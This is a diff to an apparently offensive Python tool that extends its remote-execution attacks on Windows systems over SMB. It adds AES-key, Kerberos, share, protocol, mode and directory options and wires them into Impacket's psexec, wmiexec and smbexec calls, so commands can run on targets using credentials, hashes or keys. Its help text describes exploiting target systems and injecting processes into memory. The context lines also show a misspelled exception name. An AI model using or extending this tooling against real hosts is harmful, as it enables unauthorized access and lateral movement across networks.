@@ -145,12 +145,18 @@ def main():
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
     remote_attack.add_argument("--domain", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     remote_attack.add_argument("--user", action="store", dest="usr", default="Administrator", help="The username that will be used to exploit the system, defaults to administrator")
-    remote_attack.add_argument("-pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
+    remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
     method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
     method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
     method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
     method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the invoker process into the system memory with at")
     generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
+    remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
+    remote_attack.add_argument("--kerberos", action="store", dest="kerberos", default=False, help="The Kerberos option")
+    remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
+    remote_attack.add_argument('--mode', action="store", dest="mode", choices={"SERVER","SHARE"}, default="SHARE", help="Mode to use for --smbexec, default is SHARE, the other option is SERVER, which requires root access")
+    remote_attack.add_argument("--protocol", action="store", dest="protocol", choices={"445/SMB","139/SMB"}, default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
+    remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
@@ -175,6 +181,11 @@ def main():
     wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
     psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
     atexec_cmd = args.atexec_cmd
+    aes = args.aes_key
+    kerberos = args.kerberos
+    share = args.share
+    protocol = args.protocol
+    directory = args.directory
     usr = args.usr
     pwd = args.pwd
     dom = args.dom
@@ -182,10 +193,15 @@ def main():
     command = args.command
     filename = args.filename
     sam_dump = args.sam_dump
+    mode = args.mode
+    no_output = False
     execution = ""
     supplement = ""
     hash = None
     methods = False
+
+    if aes != None:
+        kerberos = True
 
     if filename:
         payload = filename
@@ -272,13 +288,13 @@ def main():
 '''
 
     if psexec_cmd:
-        attack=psexec.PSEXEC(command, path="C:\\", protocols="445/SMB", username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None)
+        attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
         attack.run(target)
     elif wmiexec_cmd:
-        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash)
+        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
         attack.run(target)
     elif smbexec_cmd:
-        attack=smbexec.CMDEXEC(protocols = "445/SMB", username = usr, password = pwd, domain = dom, hashes = hash)
+        attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
         attack.run(target)
     elif atexec_cmd:
         if command == "cmd.exe":
@@ -291,7 +307,6 @@ def main():
             attack.dump()
         except Execption as e:
             print("[!] An error occured during execution")
-
     else:
         print(instructions)
         print(x.return_command())
